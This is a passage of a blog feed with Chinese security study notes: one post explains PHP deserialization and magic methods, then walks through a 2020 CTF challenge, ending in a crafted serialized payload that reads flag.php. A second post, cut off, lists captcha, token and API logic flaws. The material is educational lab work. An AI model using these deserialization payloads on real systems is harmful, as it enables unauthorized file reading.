      <url>/2021/09/21/37WEB%E6%BC%8F%E6%B4%9E-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BPHP/</url>
      
        <content type="html"><![CDATA[<p>目前只看得懂PHP的反序列化，java没有学过，等学到了再看</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211120475.png" alt="image-20210920201006104"></p><h2 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中的一些魔术方法。</p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li><p>serialize()         //将一个对象转换成一个字符串</p></li><li><p>unserialize()    //将字符串还原成一个对象</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">触发：unserialize 函数的变量可控，文件中存在可利用的类，类中有魔术方法</span><br></pre></td></tr></table></figure></li><li><p>__construct()       //创建对象时触发</p></li><li><p>__destruct()        //对象被销毁时触发</p></li><li><p>__call()              //在对象上下文中调用不可访问的方法时触发</p></li><li><p>__callStatic()     //在静态上下文中调用不可访问的方法时触发</p></li><li><p>__get()              //用于从不可访问的属性读取数据</p></li><li><p>__set()             //用于将数据写入不可访问的属性</p></li><li><p>__isset()           //在不可访问的属性上调用 isset()或 empty()触发</p></li><li><p>__unset()          //在不可访问的属性上使用 unset()时触发</p></li><li><p>__invoke()        //当脚本尝试将对象调用为函数时触发</p></li></ul><h3 id="其他魔术方法"><a href="#其他魔术方法" class="headerlink" title="其他魔术方法"></a>其他魔术方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/20175211lyz/p/11403397.html</span><br></pre></td></tr></table></figure><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211120425.png" alt="image-20210920211557551"></p><h3 id="无类"><a href="#无类" class="headerlink" title="无类"></a>无类</h3><h4 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h4><p>将对象转换为字符串的过程称为序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;zpzp&#x27;</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$key</span>);   <span class="comment">//将对象转换为字符串</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$num</span>);   <span class="comment">//将对象转换为字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">s:<span class="number">4</span>:<span class="string">&quot;zpzp&quot;</span>;<span class="comment">//其中s代表的是数据类型,4代表的是数据长度，&quot;zpzp&quot;代表数据内容</span></span><br><span class="line">i:<span class="number">123</span>;<span class="comment">//同理,i代表的是int,不过int类型没有长度</span></span><br></pre></td></tr></table></figure><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h4><p>将字符串转换为对象的过程称为反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&#x27;s:5:&quot;hello&quot;;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> unserialize(<span class="variable">$key</span>);    <span class="comment">//将字符串转换为对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &gt;&gt;&gt;&gt;</span><br><span class="line">hello</span><br></pre></td></tr></table></figure><h3 id="有类"><a href="#有类" class="headerlink" title="有类"></a>有类</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ABC</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//对象被创建时触发</span></span><br><span class="line">        <span class="variable">$test</span> =<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了构造函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="comment">//对象被销毁时触发</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了析构函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//调用unserialize函数时触发</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;调用了苏醒函数&lt;br&gt;&#x27;</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;创建对象 a&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> ABC;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;序列化&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_ser</span>=serialize(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a_ser</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;反序列化&lt;br/&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$a_unser</span> = unserialize(<span class="variable">$a_ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;对象快要死了！&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;</span><br><span class="line">创建对象 a</span><br><span class="line">调用了构造函数</span><br><span class="line">序列化</span><br><span class="line">O:<span class="number">3</span>:<span class="string">&quot;ABC&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;N;&#125;</span><br><span class="line">反序列化</span><br><span class="line">调用了苏醒函数</span><br><span class="line">对象快要死了！调用了析构函数</span><br><span class="line">调用了析构函数</span><br></pre></td></tr></table></figure><p>可以看到当我们创建了对象a时，自动调用了<code>__construct</code>函数，然后当我们调用反序列化函数<code>unserialize</code>自动调用了<code>__wakeup</code>函数，当程序结束的时候自动调用了<code>__destruct</code>函数。这就是类中魔术方法的触发条件。当然这里没有举例出调用<code>serialize</code>时触发的魔术函数，它是<code>__sleep</code>函数。</p><h2 id="演示案例"><a href="#演示案例" class="headerlink" title="演示案例"></a>演示案例</h2><h3 id="先搞一把-PHP-反序列化热身题稳住-无类问题-本地"><a href="#先搞一把-PHP-反序列化热身题稳住-无类问题-本地" class="headerlink" title="先搞一把 PHP 反序列化热身题稳住-无类问题-本地"></a>先搞一把 PHP 反序列化热身题稳住-无类问题-本地</h3><p>test.php文件内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$KEY</span> = <span class="string">&quot;xiaodi&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (unserialize(<span class="variable">$str</span>) === <span class="string">&quot;<span class="subst">$KEY</span>&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>flag.php文件内容:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&#123;abcdefghigjl&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/xlh/test.php?str=s:6:&quot;xiaodi&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211120309.png" alt="image-20210920204813392"></p><h3 id="最后顶一把网鼎杯-2020-青龙大真题舒服下-有类魔术方法触发-实例"><a href="#最后顶一把网鼎杯-2020-青龙大真题舒服下-有类魔术方法触发-实例" class="headerlink" title="最后顶一把网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例"></a>最后顶一把网鼎杯 2020 青龙大真题舒服下-有类魔术方法触发-实例</h3><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$op</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$content</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$op</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        <span class="variable">$content</span> = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$res</span> = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$res</span>) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$s</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$s</span>); <span class="variable">$i</span>++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &gt;= <span class="number">32</span> &amp;&amp; ord(<span class="variable">$s</span>[<span class="variable">$i</span>]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$str</span> = (<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="variable">$obj</span> = unserialize(<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>查看代码可以看出来，GET方式传入序列化的str字符串，str字符串中每一个字符的ASCII范围在32到125之间，然后对其反序列化。当执行<code>unserialize</code>函数时，会调用<code>__destruct</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">        <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里<code>===</code>代表强类型比较，需要数值和类型都相等才是相等。所有如果我们这里输入2或者’ 2’都可以绕过。绕过以后就会进入<code>process()</code>函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="variable">$res</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>process</code>函数中，op==”2”是弱类型比较==，数值相等就是想相等，所有我们之前的输入和这里是相等的，然后就会执行read函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$res</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">        <span class="variable">$res</span> = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$res</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>read函数会根据filename读取文件。然后执行output函数将读到的内容进行输出。</p><p>整个利用思路就很明显了，还有一个需要注意的地方是，$op,$filename,$content三个变量权限都是protected，而protected权限的变量在序列化的时会有%00*%00字符，%00字符的ASCII码为0，就无法通过上面的is_valid函数校验。</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109202203836.png" alt="image-20210920220344786"></p><p>这里绕过方法就是修改熟悉为public，php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public进行绕过即可</p><p>所以最后我们的代码是</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$op</span>=<span class="string">&#x27; 2&#x27;</span>;<span class="comment">//源码告诉我们 op 为 1 时候是执行写入为 2 时执行读</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;flag.php&quot;</span>;<span class="comment">//文件开头调用的是 flag.php</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>=<span class="string">&quot;xd&quot;</span>;     <span class="comment">//随便写的，因为要三个参数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$flag</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line"><span class="variable">$flag_1</span> = serialize(<span class="variable">$flag</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag_1</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里序列化一下是：所以最后的结果就是这个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:2:&quot;xd&quot;;&#125;</span><br></pre></td></tr></table></figure><h2 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h2><ul><li><a href="http://www.dooccn.com/php/">http://www.dooccn.com/php/</a></li><li><a href="https://www.ctfhub.com/#/challenge">https://www.ctfhub.com/#/challenge</a></li><li><a href="https://ctf.bugku.com/challenges#flag.php">https://ctf.bugku.com/challenges#flag.php</a></li><li><a href="https://cgctf.nuptsast.com/challenges#Web">https://cgctf.nuptsast.com/challenges#Web</a></li><li><a href="https://www.cnblogs.com/20175211lyz/p/11403397.html">https://www.cnblogs.com/20175211lyz/p/11403397.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 小迪学习笔记 </tag>
            
            <tag> PHP反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>36WEB漏洞-逻辑越权之验证码与Token及接口</title>
      <link href="/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/"/>
      <url>/2021/09/21/36WEB%E6%BC%8F%E6%B4%9E-%E9%80%BB%E8%BE%91%E8%B6%8A%E6%9D%83%E4%B9%8B%E9%AA%8C%E8%AF%81%E7%A0%81%E4%B8%8EToken%E5%8F%8A%E6%8E%A5%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>😆😆😆😆😆😆</p><span id="more"></span><h3 id="验证安全"><a href="#验证安全" class="headerlink" title="验证安全"></a>验证安全</h3><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109191700595.png" alt="image-20210919170012434" style="zoom:50%;" /><h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><p><strong>分类</strong></p><p>图片，手机或邮箱，语音，视频，操作等</p><p><strong>原理</strong></p><p>验证生成或验证过程中的逻辑问题</p><p><strong>危害</strong></p><p>账户权限泄漏，短信轰炸，遍历，任意用户操作等</p><p><strong>漏洞</strong></p><p>客户端回显，验证码复用，验证码爆破，绕过等</p><p><strong>验证码识别插件工具使用</strong></p><ul><li>Pkav_Http_Fuzz(不好用)</li><li>captcha-killer（burp插件）</li><li>reCAPTCHA </li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/cwkiller/p/12659549.html</span><br></pre></td></tr></table></figure><p><strong>服务端验证</strong></p><p>第一次输入正确的验证码，之后使用同样的验证码进行发包，从而成功绕过。这是因为服务器在判断的时候，只是将第一次进行验证，然后生成一个session，验证结束后没有删除session，导致之后可以一直使用该验证码进行验证。</p><p><strong>客户端验证</strong></p><p>通过调用JS代码进行验证码的验证工作。可以查看前端JS代码，或者network中加载的JS文件来确定是不是前端验证。</p><h4 id="token-安全"><a href="#token-安全" class="headerlink" title="token 安全"></a>token 安全</h4><p><strong>原理</strong></p><p>Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。</p><p><strong>token 客户端回显</strong></p><p>token在前端有回显，可以获取到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/weixin_44110913/article/details/109368455</span><br></pre></td></tr></table></figure><p><strong>token无回显</strong></p><p>看看是否有规律，是否可以爆破，一般都不行</p><h3 id="接口安全问题"><a href="#接口安全问题" class="headerlink" title="接口安全问题"></a>接口安全问题</h3><p>调用，遍历，未授权，篡改等</p><ul><li>调用案例：短信轰炸</li><li>遍历案列：UID 等遍历</li><li>callback 回调 JSONP</li></ul><h3 id="未授权访问："><a href="#未授权访问：" class="headerlink" title="未授权访问："></a>未授权访问：</h3><p>与越权漏洞区别</p><ul><li>Jboss 未授权访问</li><li>Jenkins 未授权访问</li><li>ldap 未授权访问</li><li>Redis 未授权访问</li><li>elasticsearch 未授权访问</li><li>MenCache 未授权访问</li><li>Mongodb 未授权访问</li><li>Rsync 未授权访问</li><li>Zookeeper 未授权访问</li><li>Docker 未授权访问</li></ul><h3 id="涉及资源："><a href="#涉及资源：" class="headerlink" title="涉及资源："></a>涉及资源：</h3><ul><li><a href="https://www.lanzous.com/i1z2s3e">https://www.lanzous.com/i1z2s3e</a></li><li><a 